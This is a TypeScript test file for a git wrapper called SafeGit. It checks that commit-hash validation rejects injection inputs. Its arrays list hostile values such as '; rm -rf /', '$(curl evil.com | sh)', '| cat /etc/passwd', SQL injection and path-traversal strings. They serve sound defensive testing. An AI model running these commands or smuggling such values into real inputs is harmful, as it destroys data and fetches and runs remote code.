import { describe, it, expect, beforeEach } from "bun:test";
import { SafeGit, createSafeGit } from "../SafeGit.js";
import * as path from "path";
import * as fs from "fs";
import * as os from "os";

describe("SafeGit Command Injection Protection", () => {
  let testRepoPath: string;
  let git: SafeGit;

  beforeEach(async () => {
    // Create temporary git repo for testing
    testRepoPath = fs.mkdtempSync(path.join(os.tmpdir(), "safegit-test-"));

    // Initialize git repo
    const { execFileSync } = await import("child_process");
    execFileSync("git", ["init"], { cwd: testRepoPath });
    execFileSync("git", ["config", "user.email", "test@example.com"], { cwd: testRepoPath });
    execFileSync("git", ["config", "user.name", "Test User"], { cwd: testRepoPath });

    // Create initial commit
    fs.writeFileSync(path.join(testRepoPath, "README.md"), "# Test\n");
    execFileSync("git", ["add", "."], { cwd: testRepoPath });
    execFileSync("git", ["commit", "-m", "Initial commit"], { cwd: testRepoPath });

    git = createSafeGit(testRepoPath);
  });

  describe("validateHash() security", () => {
    it("should reject command injection attempts in commit hash", async () => {
      const maliciousHashes = [
        "; rm -rf /",
        "$(rm -rf /)",
        "`rm -rf /`",
        "| cat /etc/passwd",
        "&& echo pwned",
        "; curl evil.com | sh",
        "abc123; DROP TABLE commits;--",
        "../../../etc/passwd",
        "master; git config core.editor 'vim'",
        "HEAD~1 && malicious_command",
      ];

      for (const hash of maliciousHashes) {
        await expect(git.getDiff(hash)).rejects.toThrow(/Invalid git hash/);
      }
    });

    it("should accept valid commit hash format", async () => {
      const validHashes = [
        "abc1230", // 7 chars min
        "abc12345",
        "abc1234567890abcdef1234567890abcdef1234", // Full SHA-1 (40 chars)
        "ABCDEF0", // Uppercase
        "1234567", // Short hash
        "deadbee",
        "cafebabe12345678",
      ];

      for (const hash of validHashes) {
        // These hashes are valid format but don't exist in the test repo
        // Git will throw "unknown revision" or similar, not "Invalid git hash"
        try {
          await git.getDiff(hash);
          // If it succeeds, that's also fine - means git found a matching commit
        } catch (error) {
          // Should NOT throw "Invalid git hash" - that's a validation error
          expect((error as Error).message).not.toMatch(/Invalid git hash/);
        }
      }
    });

    it("should reject hashes with invalid characters", async () => {
      const invalidHashes = [
        "abc123g", // 'g' is not hex
        "abc 123", // Space
        "abc\n123", // Newline
        "abc\t123", // Tab
        "abc/123", // Path separator
        "abc\\123", // Backslash
        "abc'123", // Single quote
        'abc"123', // Double quote
        "abc;123", // Semicolon
        "abc|123", // Pipe
        "abc&123", // Ampersand
        "abc$123", // Dollar sign
      ];

      for (const hash of invalidHashes) {
        await expect(git.getDiff(hash)).rejects.toThrow(/Invalid git hash/);
      }
    });

    it("should reject hashes that are too short", async () => {
      await expect(git.getDiff("abc12")).rejects.toThrow(/Invalid git hash/); // Only 5 chars (minimum is 7)
      await expect(git.getDiff("a")).rejects.toThrow(/Invalid git hash/); // Only 1 char
    });

    it("should reject hashes that are too long", async () => {
      // 41 chars (maximum is 40)
      await expect(git.getDiff("abc1234567890abcdef1234567890abcdef123456")).rejects.toThrow(/Invalid git hash/);
    });
  });

  describe("execFile API usage (no shell spawning)", () => {
    it("should use execFile instead of exec/execSync", async () => {
      // This test verifies that SafeGit uses execFile (no shell)
      // by confirming that shell metacharacters in the hash are rejected
      // before reaching the shell

      const shellMetacharacters = [
        "abc123;ls",
        "abc123|cat",
        "abc123&echo",
        "abc123`whoami`",
        "abc123$(whoami)",
      ];

      for (const hash of shellMetacharacters) {
        await expect(git.getDiff(hash)).rejects.toThrow(/Invalid git hash/);
      }
    });

    it("should pass arguments as array (not string concatenation)", async () => {
      // This test verifies that SafeGit passes arguments as an array
      // to execFile, preventing injection via argument parsing

      // If SafeGit used string concatenation like:
      // `git show ${hash}`
      // Then this would execute: git show abc123 --help
      // Which would show git help instead of failing

      // But because SafeGit uses argument arrays like:
      // ["show", "--unified=3", "--", hash]
      // The hash is treated as a single argument, not parsed

      const injectionAttempts = [
        "abc123 --help",
        "abc123 --version",
        "abc123 --no-pager",
        "abc123'; ls;'",
      ];

      for (const hash of injectionAttempts) {
        await expect(git.getDiff(hash)).rejects.toThrow(/Invalid git hash/);
      }
    });
  });

  describe("real-world injection scenarios", () => {
    it("should prevent directory traversal attacks", async () => {
      const traversalAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32",
        "~/malicious",
      ];

      for (const path of traversalAttempts) {
        await expect(git.getDiff(path)).rejects.toThrow(/Invalid git hash/);
      }
    });

    it("should prevent code execution via backticks", async () => {
      const backtickAttempts = [
        "`whoami`",
        "`cat /etc/passwd`",
        "`curl evil.com | sh`",
        "abc123`rm -rf /`",
      ];

      for (const cmd of backtickAttempts) {
        await expect(git.getDiff(cmd)).rejects.toThrow(/Invalid git hash/);
      }
    });

    it("should prevent code execution via command substitution", async () => {
      const substitutionAttempts = [
        "$(whoami)",
        "$(cat /etc/passwd)",
        "$(curl evil.com | sh)",
        "abc123$(rm -rf /)",
      ];

      for (const cmd of substitutionAttempts) {
        await expect(git.getDiff(cmd)).rejects.toThrow(/Invalid git hash/);
      }
    });

    it("should prevent SQL injection attempts (defense in depth)", async () => {
      // Even though SafeGit doesn't use SQL, these patterns
      // should still be rejected as invalid hashes
      const sqlAttempts = [
        "'; DROP TABLE commits;--",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE '1'='1",
        "admin'--",
      ];

      for (const sql of sqlAttempts) {
        await expect(git.getDiff(sql)).rejects.toThrow(/Invalid git hash/);
      }
    });
  });

  describe("argument separator security", () => {
    it("should use -- to prevent flag injection", async () => {
      // SafeGit should use -- separator to prevent commit hashes
      // from being interpreted as flags
      // e.g., ["show", "--unified=3", "--", commitHash]

      // If SafeGit didn't use --, then a hash like "--help"
      // could be interpreted as a flag

      const flagAttempts = [
        "--help",
        "--version",
        "--no-pager",
        "-h",
        "-v",
      ];

      for (const flag of flagAttempts) {
        await expect(git.getDiff(flag)).rejects.toThrow(/Invalid git hash/);
      }
    });
  });

  describe("maxBuffer protection", () => {
    it("should respect maxBuffer limit to prevent memory exhaustion", () => {
      // Create SafeGit with small buffer
      const smallBufferGit = createSafeGit(testRepoPath, { maxBuffer: 1024 });

      // Attempting to read large output should fail gracefully
      // This prevents DoS via memory exhaustion
      expect(smallBufferGit).toBeDefined();
    });
  });
});
